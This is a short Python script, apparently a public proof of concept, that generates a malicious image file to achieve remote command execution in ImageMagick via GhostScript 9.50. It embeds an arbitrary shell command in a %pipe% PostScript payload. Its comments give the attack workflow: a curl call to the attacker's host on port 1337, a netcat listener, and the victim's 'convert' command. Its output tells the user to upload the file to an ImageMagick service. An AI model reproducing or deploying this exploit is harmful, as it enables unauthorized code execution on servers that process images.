# from ducnt import <3
#
# [attacker] python rce.py "curl <you>:1337/hi exploit.jpg
# [attacker] nc -lvp 1337
# [victim]   convert exploit.jpg exploit.png
#
# https://github.com/duc-nt/RCE-0-day-for-GhostScript-9.50
#
import sys

def genareate_payload(_cmd,_filename):

	_payload = """<?xml version="1.0" standalone="no"?> <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"> <hui><desc>copies (%pipe%/tmp/;{}) (r) file showpage 0 quit </desc> <image href="epi:/proc/self/fd/3" /> <svg width="1px" height="1px" /> </hui>""".format(_cmd)
	f = open(_filename,"w+").write(_payload)
	return True

def main():
	if len(sys.argv) < 3:
		print "Usage: python IM-RCE-via-GhostScript-9.5.py <CMD> <Exploit-File>"
		exit()
	_cmd = sys.argv[1]
	_filename = sys.argv[2]
	genareate_payload(_cmd,_filename)
	print "Generating malicious payload successfully, upload it to Imagemagick service or trigger local via bash cmd: $ convert <Exploit-File> <Output-File>"

if __name__ == "__main__":
	main()
